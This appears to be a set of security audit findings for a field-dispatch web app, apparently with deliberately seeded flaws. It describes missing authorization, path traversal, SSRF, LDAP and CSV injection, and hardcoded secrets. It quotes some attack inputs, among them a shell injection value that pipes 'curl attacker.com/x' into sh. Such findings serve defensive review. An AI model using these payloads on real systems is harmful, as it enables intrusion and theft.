extra.message: JWT signing secret falls back to the hardcoded default 'field-dispatch-dev-jwt-secret-change-in-production' when the JWT_SECRET environment variable is not set. Anyone who knows this value (it is in the source) can forge valid signed JWTs, e.g. { id, role: 'ops_admin' }, completely bypassing authentication.

cwe: CWE-798: Use of Hard-coded Credentials

extra.message: The unauthenticated POST /api/auth/register endpoint destructures 'role' from the request body (line 104) and inserts it directly (role: role || 'customer', line 112). The user_role enum accepts 'ops_admin', so an attacker can register with role='ops_admin' and receive a signed admin JWT (line 115), gaining full administrative access. The frontend only offers customer/field_worker, but the API trusts the body.

cwe: CWE-269: Improper Privilege Management
CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: GET /api/locations requires only authentication with no tenant scoping. A customer-role user receives every customer's locations, including street addresses and access instructions such as gate codes ('Gate code: 4521' in seed data). The where clause is built solely from the optional customerId query parameter, unlike /api/customers which filters to the caller's own record.

cwe: CWE-862: Missing Authorization

extra.message: GET /api/jobs/export/completion-report builds CSV rows by direct template interpolation of job title and customer company name with no escaping at all (unlike /api/jobs/export/csv which quotes fields). Job titles are user-controlled (job creation/CSV import), so commas/quotes/newlines corrupt the report and values beginning with =, +, -, or @ execute as formulas when the file is opened in Excel (CSV formula injection).

cwe: CWE-1236: Improper Neutralization of Formula Elements in a CSV File

extra.message: POST /api/proofs/upload accepts any file type: the extension is taken from the client-supplied filename (data.filename.split('.').pop()) with no MIME/extension allowlist, and the file is written into UPLOAD_DIR which is served same-origin by @fastify/static under /uploads/ (registered at line 39). Uploading an HTML/SVG file containing script and opening /uploads/<nanoid>.html executes attacker-controlled JavaScript in the application origin, enabling theft of the JWT kept in localStorage (stored XSS).

cwe: CWE-434: Unrestricted Upload of File with Dangerous Type
CWE-79: Cross-site Scripting

extra.message: GET /api/routes/:id performs no authorization beyond authentication. Any authenticated user (including customers) can fetch any route, and the response enriches every stop with the full job plus its customer and location records (addresses, contact data) belonging to other customers — cross-tenant data exposure.

cwe: CWE-862: Missing Authorization

extra.message: POST /api/import/customers creates user accounts for imported rows with the hardcoded shared password 'imported123'. Anyone who knows the source code can log into any imported customer account, since every imported user receives this well-known credential.

cwe: CWE-259: Use of Hard-coded Password

extra.message: POST /api/incidents/:id/attachments passes the raw client-controlled multipart filename into resolve(archiveDir, data.filename) and writes it with fs.writeFileSync(destination, buffer). A filename such as '../../../../etc/cron.d/evil' escapes the incident-archive directory, giving an arbitrary file write anywhere the process has permissions (path traversal). The paired worker-certifications endpoint sanitizes with path.basename(); this one keeps the reviewer-supplied filename verbatim.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: syncCustomerToExternalCrm sends the CRM API key as a URL query parameter (?api_key=${crmKey}) and defaults to a plain-HTTP base URL (http://crm.internal.example.com). Full URLs including credentials are recorded in server, proxy, and fetch logs and are visible on the wire, leaking CRM_API_KEY. The paired payroll feed correctly passes its key in an Authorization header.

cwe: CWE-598: Use of GET Request Method With Sensitive Query Strings

extra.message: GET /api/jobs/:id/rate-detail bases its authorization decision on the client-supplied dataLevel query parameter: when dataLevel === 'full' it returns the entire job record, including internalNotes, to ANY authenticated user with no role or ownership check. A customer or field worker can read internal notes for any job just by appending ?dataLevel=full. The paired coverage-detail endpoint verifies dispatcher-region assignment server-side.

cwe: CWE-862: Missing Authorization

extra.message: PATCH /api/customers/:id/account-settings merges the request body over the customer record with Object.assign(customer, request.body) and writes the result. There is no role or ownership check (any authenticated user can modify ANY customer) and no field allowlist, so attackers can mass-assign arbitrary columns such as userId (relinking the customer to their own account to take over its data and jobs) or isActive. The paired service-type settings endpoint validates with a strict zod schema.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
CWE-862: Missing Authorization

extra.message: GET /api/routes/:id/timing-diagnostics returns raw err.message and err.stack whenever the request carries any 'diagnosticSession' cookie. The cookie value is never validated, so any authenticated user can set an arbitrary cookie value to obtain internal stack traces and error details. The paired incident audit-detail endpoint correctly gates this behavior on NODE_ENV === 'development'.

cwe: CWE-209: Generation of Error Message Containing Sensitive Information

extra.message: The portal quick-access session cookie is set with only { path: '/' } — no httpOnly, no secure, no sameSite (the paired shift-context cookie at line 1349 sets all three) — and entries in portalQuickAccessSessions never expire (createdAt is stored but never checked, unlike the shift-context expiry check). GET /api/customers/portal-quick-access/context authenticates solely via this cookie, so the session id is readable by JavaScript (stealable via XSS), sent over plain HTTP, and valid forever.

cwe: CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag
CWE-613: Insufficient Session Expiration

extra.message: GET /api/jobs/:id/certificate requires only authentication with no role or ownership check, so any authenticated user can download the branded completion certificate — containing the job title, customer company name, and completion date — for any job in the system. The paired rate-sheet endpoint is restricted to ops_admin/dispatcher.

cwe: CWE-639: Authorization Bypass Through User-Controlled Key

extra.message: The certificate download places the raw export_name query parameter into the Content-Disposition header (attachment; filename="${label}.txt") without stripping CR/LF characters. A value containing %0d%0a (or literal newlines) allows HTTP header injection / response splitting. The paired rate-sheet endpoint sanitizes the label with .replace(/[\r\n]/g, '') before building the same header.

cwe: CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')

extra.message: GET /api/workers/directory-search interpolates the client-supplied 'uid' query parameter directly into the LDAP search filter string (`(uid=${uid})`) without any escaping, allowing LDAP injection (wildcards like uid=*, boolean filter manipulation such as uid=*)(|(uid=*, or null-byte truncation) to alter the corporate directory query. The paired directory-lookup endpoint escapes its input with escapeDirectoryFilter().

cwe: CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')

extra.message: POST /api/jobs/search-activity logs the client-supplied searchQuery directly (app.log.info(`Job search by ...: ${searchQuery}`)) without stripping CR/LF/NUL, allowing log forging — an attacker can inject fake log lines to plant false activity or hide their trail in the trail that support staff review. The paired incident action endpoint sanitizes with .replace(/[\r\n\0]/g, ' ').

cwe: CWE-117: Improper Output Neutralization for Logs

extra.message: POST /api/routes/:id/plan-snapshot restores state from a client-supplied token decrypted with AES-256-CBC using a key derived from a hardcoded default secret ('dispatch-route-plan-key') and with no integrity protection (no HMAC/auth tag). The default key is public in source, so anyone can forge or modify snapshot tokens; unauthenticated CBC plus distinct error messages for padding ('bad decrypt') vs parse failures exposes a padding oracle for decrypting other users' tokens. The paired check-in payload endpoint uses authenticated AES-256-GCM with an auth tag.

cwe: CWE-327: Use of a Broken or Risky Cryptographic Algorithm
CWE-798: Use of Hard-coded Credentials

extra.message: GET /api/partners/tracking-widget/:jobId has no authentication preHandler at all, and it reflects any request Origin back into the Access-Control-Allow-Origin response header. Any website can read responses cross-origin, and anyone who learns a job UUID can poll its title and status without credentials. The paired customer status-widget requires authentication and allowlists origins (ALLOWED_STATUS_WIDGET_ORIGINS).

cwe: CWE-306: Missing Authentication for Critical Function
CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: The customer intake form logs the entire raw request body on validation failure (app.log.warn({ intake: request.body, ... })). The intake schema includes bankRoutingNumber and bankAccountNumber, so failed submissions write victims' bank account details into application logs where they may be retained and read by anyone with log access.

cwe: CWE-532: Insertion of Sensitive Information into Log File

extra.message: GET /api/regions/:id/archive-export builds a shell command by interpolating the client-controlled 'outputType' query parameter (const format = outputType || 'gzip'; const cmd = `tar -czf ${archivePath} --${format} -C ${archiveDir} .`) and executes it via spawn(cmd, [], { shell: true }). A dispatcher can inject shell metacharacters — e.g. ?outputType=gzip;curl attacker.com/x|sh — to execute arbitrary OS commands on the server. The paired coverage-export endpoint validates the preset against an allowlist and uses shell:false with an argument array.

cwe: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

extra.message: POST /api/admin/service-types/:id/icon-upload writes the uploaded file to resolve(iconDir, data.filename) using the raw client-supplied filename with no sanitization, so a filename like '../../../.bashrc' escapes the service-icons directory (arbitrary file write). The paired region badge-upload generates a random filename, validates the MIME type against an allowlist, and enforces a size limit.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: POST /api/webhooks/:id/test-delivery fetches a URL taken directly from the client-supplied 'x-webhook-callback' request header (falling back to webhook.url) with no validation or scheme/host restrictions. An attacker can make the server send requests to arbitrary internal targets — http://localhost ports, internal services, cloud metadata endpoints (169.254.169.254) — and observe the response status (server-side request forgery). The paired verify-document-source endpoint checks a host allowlist.

cwe: CWE-918: Server-Side Request Forgery (SSRF)

extra.message: POST /api/workers/onboard-account passes the client-supplied 'costFactor' body field directly to bcrypt.hash(password, costFactor || 4). A caller can supply a very high cost (e.g. 31) to force extremely long CPU-bound hashing (denial of service on the admin endpoint) or a minimal cost to produce weak password hashes. The paired dispatcher onboarding endpoint uses a fixed cost of 12.

cwe: CWE-400: Uncontrolled Resource Consumption
